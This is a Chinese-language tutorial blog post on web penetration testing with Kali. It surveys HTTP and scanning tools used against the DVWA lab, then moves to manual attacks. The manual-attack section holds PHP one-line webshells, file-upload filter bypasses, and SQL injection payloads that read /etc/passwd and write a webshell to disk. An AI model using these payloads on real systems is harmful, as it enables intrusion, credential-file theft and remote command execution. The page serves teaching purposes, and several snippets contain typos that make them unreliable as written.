<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.0"><link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="baidu-site-verification" content="EtrqTppKP2zrDi7r"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"uestc-toy.github.io",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:null},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!0,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!0,pangu:!1,comments:{style:"tabs",active:"valine",storage:!0,lazyload:!1,nav:null,activeClass:"valine"},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="HTTP协议明文：无内建的机密性安全机制嗅探或代理截断可查看全部明文信息https只能提高传输层安全无状态：每一次客户端和服务器端的通信都是独立的过程WEB应用需要跟踪客户端会话(多步通信)不使用cookie的应用，客户端每次请求都要重新身份验证(不现实)Session用于在用户身份验证后跟踪用户行为轨迹：提高用户体验，但增加了攻击向量"><meta property="og:type" content="article"><meta property="og:title" content="Kali使用教程（三）：Web渗透"><meta property="og:url" content="http://uestc-toy.github.io/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/index.html"><meta property="og:site_name" content="小yi的blog"><meta property="og:description" content="HTTP协议明文：无内建的机密性安全机制嗅探或代理截断可查看全部明文信息https只能提高传输层安全无状态：每一次客户端和服务器端的通信都是独立的过程WEB应用需要跟踪客户端会话(多步通信)不使用cookie的应用，客户端每次请求都要重新身份验证(不现实)Session用于在用户身份验证后跟踪用户行为轨迹：提高用户体验，但增加了攻击向量"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616201151479.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617163535961.png"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617170103014.png"><meta property="article:published_time" content="2020-07-05T10:36:36.000Z"><meta property="article:modified_time" content="2020-07-27T01:29:32.299Z"><meta property="article:author" content="tosang"><meta property="article:tag" content="Kali"><meta property="article:tag" content="Linux"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616201151479.png"><link rel="canonical" href="http://uestc-toy.github.io/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.css"><style>#needsharebutton-postbottom{cursor:pointer;height:26px;margin-top:10px;position:relative}#needsharebutton-postbottom .btn{border:1px solid $btn-default-border-color;border-radius:3px;display:initial;padding:1px 4px}</style><style>#needsharebutton-float{bottom:88px;cursor:pointer;left:-8px;position:fixed;z-index:9999}#needsharebutton-float .btn{border:1px solid $btn-default-border-color;border-radius:4px;padding:0 10px 0 14px}</style><title>Kali使用教程（三）：Web渗透 | 小yi的blog</title><script data-pjax>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?063295f670f17958c713a81e3a2d6844";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">小yi的blog</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">从前很忙</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><a role="button" class="book-mark-link book-mark-link-fixed"></a><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://uestc-toy.github.io/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><meta itemprop="name" content="tosang"><meta itemprop="description" content="blog、记录和分享"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="小yi的blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Kali使用教程（三）：Web渗透</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-07-05 18:36:36" itemprop="dateCreated datePublished" datetime="2020-07-05T18:36:36+08:00">2020-07-05</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-07-27 09:29:32" itemprop="dateModified" datetime="2020-07-27T09:29:32+08:00">2020-07-27</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a> </span></span><span id="/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/" class="post-meta-item leancloud_visitors" data-flag-title="Kali使用教程（三）：Web渗透" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>15k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>14 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><blockquote><p>明文：<br>无内建的机密性安全机制<br>嗅探或代理截断可查看全部明文信息<br>https只能提高传输层安全<br>无状态：<br>每一次客户端和服务器端的通信都是独立的过程<br>WEB应用需要跟踪客户端会话(多步通信)<br>不使用cookie的应用，客户端每次请求都要重新身份验证(不现实)<br>Session用于在用户身份验证后跟踪用户行为轨迹：<br>提高用户体验，但增加了攻击向量</p></blockquote><a id="more"></a><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cycle</span>:</span><br><span class="line">	请求/响应</span><br><span class="line">重要的<span class="attribute">header</span>:</span><br><span class="line">    <span class="attribute">Set-Cookie</span>:服务器发给客户端的SessionID ( 被窃取的风险)</span><br><span class="line">    <span class="attribute">Content-Length</span>:响应body部分的字节长度</span><br><span class="line">    <span class="attribute">Location</span>:重定向用户到另一个页面，可识别身份认证后允许访问的页面</span><br><span class="line">    <span class="attribute">Cookie</span>:客户端发回给服务器证明用户状态的信息(头:值成对出现)</span><br><span class="line">    <span class="attribute">Referrer</span>:发起新请求之前用户位于哪个页面，服务器基于此头的安全限制很容</span><br><span class="line">    易被修改绕过</span><br></pre></td></tr></table></figure><h4 id="HTTP协议状态码"><a href="#HTTP协议状态码" class="headerlink" title="HTTP协议状态码"></a>HTTP协议状态码</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">服务端响应的状态码表示响应的结果类型(<span class="number">5</span>大类<span class="number">50</span>多 个具体响应码)</span><br><span class="line"><span class="number">100</span>s:服务器响应的信息，通常表示服务器还有后续处理，很少出现</span><br><span class="line"><span class="number">200</span>s:请求被服务器成功接受并处理后返回的响应结果</span><br><span class="line"><span class="number">300</span>s:重定向，通常在身份认证成功后重定向到一个安全页面(<span class="number">301</span>/<span class="number">302</span>)</span><br><span class="line"><span class="number">400</span>s:表示客户端请求错误</span><br><span class="line">	<span class="number">401</span>:需要身份验证</span><br><span class="line">	<span class="number">403</span>:拒绝访问</span><br><span class="line">	<span class="number">404</span>:目标未发现</span><br><span class="line"><span class="number">500</span>s:服务器内部错误(<span class="number">503</span>: 服务不可用)</span><br><span class="line">http:<span class="comment">//www.w3.org/Protocols/rfc26 1 6/rfc2616 sec 10.html</span></span><br></pre></td></tr></table></figure><hr><h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><h4 id="Httrack"><a href="#Httrack" class="headerlink" title="Httrack"></a>Httrack</h4><blockquote><p>使用Httrack去下载目标网站资源，减少与目标系统的交互</p></blockquote><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="NIKTO"><a href="#NIKTO" class="headerlink" title="NIKTO"></a>NIKTO</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Perl语言开发的开源web安全扫描器</span><br><span class="line">软件版本</span><br><span class="line">搜索存在安全隐患的文件</span><br><span class="line">服务器配置漏洞</span><br><span class="line">插件: nikto -list-plugins</span><br><span class="line">nikto -update</span><br><span class="line">	cirt.net</span><br><span class="line">nikto -host http://1.1.1.1</span><br><span class="line">nikto -host 192.168.1.1 -ssl -port 443</span><br><span class="line">-vhost</span><br><span class="line"></span><br><span class="line">Space - report current scan status</span><br><span class="line">v - verbose mode on/off #可视化扫描</span><br><span class="line">d - debug mode on/off</span><br><span class="line">e - error reporting on/off</span><br><span class="line">p - progress reporting on/off</span><br><span class="line">r- redirect display on/off</span><br><span class="line">C - cookie display on/off</span><br><span class="line">a - auth display on/off</span><br><span class="line">q - quit</span><br><span class="line">N - next host</span><br><span class="line">P - Pause</span><br></pre></td></tr></table></figure><h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a>vega</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JAVA编写的开源Web扫描器：</span><br><span class="line">    扫描模式</span><br><span class="line">    代理模式</span><br><span class="line">    爬站、处理表单、注入测试</span><br><span class="line">    支持<span class="string">SSL :</span> <span class="string">http:</span><span class="comment">//vega/ca.crt</span></span><br></pre></td></tr></table></figure><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C语言编写</span><br><span class="line">实验性的主动web安全评估工具</span><br><span class="line">递归爬网</span><br><span class="line">基于字典的探测</span><br><span class="line">速度较快</span><br><span class="line">	多路单线程，全异步网络I/O,消除内存管理和调度开销</span><br><span class="line">	启发式自动内容识别</span><br><span class="line">误报较低</span><br><span class="line"></span><br><span class="line">skipfish -0 test http://1.1.1.1 </span><br><span class="line">skipfish -0 test @url.txt</span><br><span class="line">skipfish -0 test -S complet.wl -W a.wl http://1.1.1.1 	#字典</span><br><span class="line">-I :只检查包含string的URL</span><br><span class="line">-X :不检查包含string的URL  #logout</span><br><span class="line">-K :不对指定参数进行Fuzz测试</span><br><span class="line"><span class="meta">	#</span><span class="bash">Fuzz测试，也叫做“模糊测试”，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试，它通过向软件输入非法的字段，观测被测试软件是否异常而实现。</span></span><br><span class="line">-D :跨站点爬另外一个域 #即扫描指定域名会跳转的域</span><br><span class="line">-l :每秒最大请求数</span><br><span class="line">-m :每IP最大并发连接数</span><br><span class="line">--config :指定配置文件</span><br><span class="line">身份认证:</span><br><span class="line">	skipfish -A user:pass -0 test http://1.1.1.1 #以表单方式</span><br><span class="line">	skipfish -C "name=val" -0 test http://1.1.1.1 #以cookie方式</span><br><span class="line">示例：</span><br><span class="line">sudo skipfish -o test1 -I /dvwa/  http://192.168.2.105/dvwa</span><br></pre></td></tr></table></figure><blockquote><p>尝试扫描dvwa靶场，结果如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616201151479.png" alt="image-20200616201151479"></p><h4 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Web Application Attack and Audit Framework,基于python语言开发</span><br><span class="line">此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</span><br><span class="line">9大类近150个plugin</span><br><span class="line">    audit(常用)</span><br><span class="line">    infrastructure</span><br><span class="line">    grep</span><br><span class="line">    evasion</span><br><span class="line">    mangle</span><br><span class="line">    auth</span><br><span class="line">    bruteforce</span><br><span class="line">    output</span><br><span class="line">    crawl(常用)</span><br><span class="line">安装:</span><br><span class="line">	cd ~</span><br><span class="line">    apt-get update</span><br><span class="line">    apt-get install -y python-pip w3af</span><br><span class="line">    pip install -upgrade pip</span><br><span class="line">    git clone https://github.com/andresriancho/w3af.git</span><br><span class="line">    cd w3af</span><br><span class="line">    ./w3af_console ( ./w3af_ gui)</span><br><span class="line">    apt-get build-dep python-lxml</span><br><span class="line">    ./tmp/w3af_ dependency_ install.sh</span><br></pre></td></tr></table></figure><h4 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kall自带了旧的arachni阉割版</span><br><span class="line">安装</span><br><span class="line">	http://www.arachni-scanner.com/download/Linux</span><br><span class="line">	tar xvf arachni.tar.gz</span><br><span class="line">    http://localhost:9292/</span><br><span class="line">    admin@admin.admin / administrator</span><br></pre></td></tr></table></figure><ul><li><p>Profile</p><ul><li>Import</li><li>Export</li><li>New</li></ul></li><li><p>Dispatcher（使用RPC服务进行分布式扫描）</p><ul><li>./arachni_ rpcd –address=127.0.0.1 –port=1111 –nickname=test1</li></ul></li><li><p>Grid（加入组，实现负载均衡）</p><ul><li>./arachni_ rpcd - nickname=test2 –address=127.0.0.1 -neighbour=127.0.0.1:1111</li></ul></li><li><p>Scan</p></li></ul><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h4><blockquote><p>强大的主动扫描工具</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在新版本kali中已经没有集成该工具，需要自行到官网下载</span><br><span class="line">WEB Application集成渗透测试和漏洞挖掘工具</span><br><span class="line">开源免费跨平台简单易用</span><br><span class="line">截断代理</span><br><span class="line">主动、被动扫描</span><br><span class="line">Fuzzy、暴力破解</span><br><span class="line">API</span><br><span class="line">	- <span class="string">http:</span><span class="comment">//zap/</span></span><br></pre></td></tr></table></figure><blockquote><p>阶段代理：首先在firefox浏览器配置OWASP的代理：ip+端口</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617163535961.png" alt="image-20200617163535961"></p><blockquote><p>扫描dvwa</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617170103014.png" alt="image-20200617170103014"></p><h4 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Web安全工具中的瑞士军刀</span><br><span class="line">统一的集成工具发现全部现代WEB安全漏洞</span><br><span class="line">PortSwigger公司开发</span><br><span class="line">    Burp Free</span><br><span class="line">    Burp Professional</span><br><span class="line">    http://www .portswigger.net</span><br><span class="line">所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交</span><br><span class="line">换信息。</span><br><span class="line">Proxy：</span><br><span class="line">	Options</span><br><span class="line">	Invisible (主机头/多目标域名)</span><br><span class="line"><span class="meta">		#</span><span class="bash">即非浏览器客户端，不支持http代理时使用</span></span><br><span class="line">	CA (导入/导出)</span><br><span class="line">	Intercept (入站 /出站)</span><br><span class="line">	Response modify</span><br><span class="line">Target： #这里主要显示目标站点结构</span><br><span class="line">	Scope (logout)</span><br><span class="line">	Filter</span><br><span class="line">	Comparing site map</span><br><span class="line">Intruder: #侵入，使用各类字典、正则、生成器来匹配登录账号或密码</span><br><span class="line">	Position：#进行匹配替换的请求头</span><br><span class="line">	Payloads：#填充数据的方式</span><br><span class="line"><span class="meta">	#</span><span class="bash">可以从Target入口找到目标站点，右键send到Intruder</span></span><br><span class="line">Repeater：#对指定页面进行request和查看response。同样可以通过send进入</span><br><span class="line">    Request History</span><br><span class="line">    Change request method</span><br><span class="line">    Change body encoding</span><br><span class="line">    Copy as curl command</span><br><span class="line">    Convert selection</span><br><span class="line">    Repeater菜单</span><br><span class="line">        Engagement tools--generate csrf PoC</span><br><span class="line">        Follow redirections</span><br><span class="line">        Process cookies in redirections</span><br><span class="line">Sequencer: #分析cookie的随机性，含各种指标</span><br><span class="line">	分析程序中可预测的数据</span><br><span class="line">	Session cookies</span><br><span class="line">	anti-CSRF tokens</span><br><span class="line">	Start live capture</span><br><span class="line">		Analyze (数据越多分析越准确)</span><br><span class="line">		伪随机数算法</span><br><span class="line">		Character-level</span><br><span class="line">		Bit-level</span><br><span class="line">	FIPS-美国联邦信息 处理标准(Federal Information Processingstandard)</span><br></pre></td></tr></table></figure><hr><h3 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a>手动漏洞挖掘</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP反弹shell：</span><br><span class="line">	/us/share/webshells/php/php-reverse-shell.php #kali自带的反弹木马</span><br><span class="line">	nc -lvp 4444 #监听弹回的shell</span><br><span class="line">File：</span><br><span class="line">	Whereis</span><br><span class="line">		lfconfig</span><br><span class="line">写入webshell</span><br><span class="line">	echo "&lt;?php \$cmd= \$_ GET["'cmd";system(\$cmd);?&gt;" &gt;</span><br><span class="line">	/var/www/3.php	</span><br><span class="line"><span class="meta">#</span><span class="bash">关于一句话反弹shell可以参考：https://zhuanlan.zhihu.com/p/30170345</span></span><br></pre></td></tr></table></figure><h4 id="会话sessionID"><a href="#会话sessionID" class="headerlink" title="会话sessionID"></a>会话sessionID</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Xss / cookie importer</span><br><span class="line">    SessionID in URL</span><br><span class="line">    嗅探</span><br><span class="line">    SessionID长期不变/永久不变</span><br><span class="line">    SessionID生成算法：</span><br><span class="line">        Sequencer</span><br><span class="line">        私有算法</span><br><span class="line">        预判下- -次登陆时生成的SessionID</span><br><span class="line">        登出后返回测试</span><br><span class="line">        salt #加盐</span><br></pre></td></tr></table></figure><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo shell_exec($_ GET['cmd']);?&gt;</span><br><span class="line">    直接上传webshell</span><br><span class="line">    修改文件类型上传webshell</span><br><span class="line">        Mimetype-文件头、 扩展名 </span><br><span class="line">        # 使用burpsuite阶段代理，然后强制修改请求头（能过medium）</span><br><span class="line">        # Mimetype会根据文件前10个字节判断文件类型，所以有时候修改后缀是无效的</span><br><span class="line">        # 对于high级别，可以修改文件名为xx.php.jpg。可以绕过文件后缀检测</span><br><span class="line">        # 一些严格检测会检测文件字节数据，判断文件类型。需要直接修改文件内容上传</span><br><span class="line">        # 一般会对上传文件目录设置只读权限</span><br></pre></td></tr></table></figure><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏	览器</span><br><span class="line">用户登录判断：</span><br><span class="line">    SELECT * FROM users WHERE user= 'uname' AND password= ' pass'</span><br><span class="line">    SELECT * FROM users WHERE user=‘name' AND password=" OR "='</span><br><span class="line">基于报错的检测方法(low)</span><br><span class="line">    '"%( )</span><br><span class="line">基于布尔的检测</span><br><span class="line">    1' and '1'='1    /    1' and '1</span><br><span class="line">    1' and‘1'='2     /    1' and‘0</span><br><span class="line">表列数/显示信息位于哪一列</span><br><span class="line">	'order by 9--     #按查询列号排序(注释符: -- )</span><br><span class="line">	select *时表字段数=查询字段数</span><br><span class="line">联合查询</span><br><span class="line">    ' union select 1,2--</span><br><span class="line">    ' union all select database(),2--</span><br><span class="line">读取文件</span><br><span class="line">	' union SELECT null, load_ file('/etc/passwd)--+</span><br><span class="line">写入文件</span><br><span class="line">	' union select null,"&lt;?php passthru($_ GET['cmd]); ?&gt;" INTO DUMPFILE</span><br><span class="line">	"/var/www/a.php" -+</span><br><span 